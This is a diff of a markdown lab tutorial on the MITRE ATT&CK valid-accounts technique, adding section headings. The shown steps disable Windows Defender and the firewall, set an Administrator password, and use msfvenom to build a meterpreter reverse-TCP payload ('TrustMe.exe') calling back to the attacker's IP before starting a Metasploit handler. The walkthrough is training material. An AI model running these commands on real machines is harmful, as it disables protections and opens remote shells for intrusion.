@@ -21,7 +21,10 @@ https://attack.mitre.org/techniques/T1078/
 Here are just some groups that have used this attack:
 
 <img width="1082" height="691" alt="image" src="https://github.com/user-attachments/assets/634d0a14-def0-42da-9f23-0b26bb3faa07" />
+<hr>
 
+## Step 1: Setting Up Our Session
+### Disable Defender
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
 <img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />
@@ -35,13 +38,17 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
+<br>
 
+### Disable Firewall
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
 ```ps
 netsh advfirewall set allprofiles state off
 ```
+<br>
 
+### Set Administrator Password
 Next, set a password for the Administrator account that you can remember
 
 ```ps
@@ -61,7 +68,9 @@ Run the following command to become root:
 ```bash
 sudo su -
 ```
+<br>
 
+### Get Linux IP
 Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
 ```bash
@@ -74,6 +83,8 @@ ifconfig
 >
 >**REMEMBER: YOUR IP WILL BE DIFFERENT**
 
+<br>
+### Start Listener
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
@@ -83,7 +94,9 @@ cd /tmp/
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
+<hr>
 
+## Step 2: Starting The Metasploit Handler
 Let's start the **Metasploit** Handler. 
 
 **Double-click** the `Ubuntu Shell` icon on the desktop to open another **Linux terminal**:
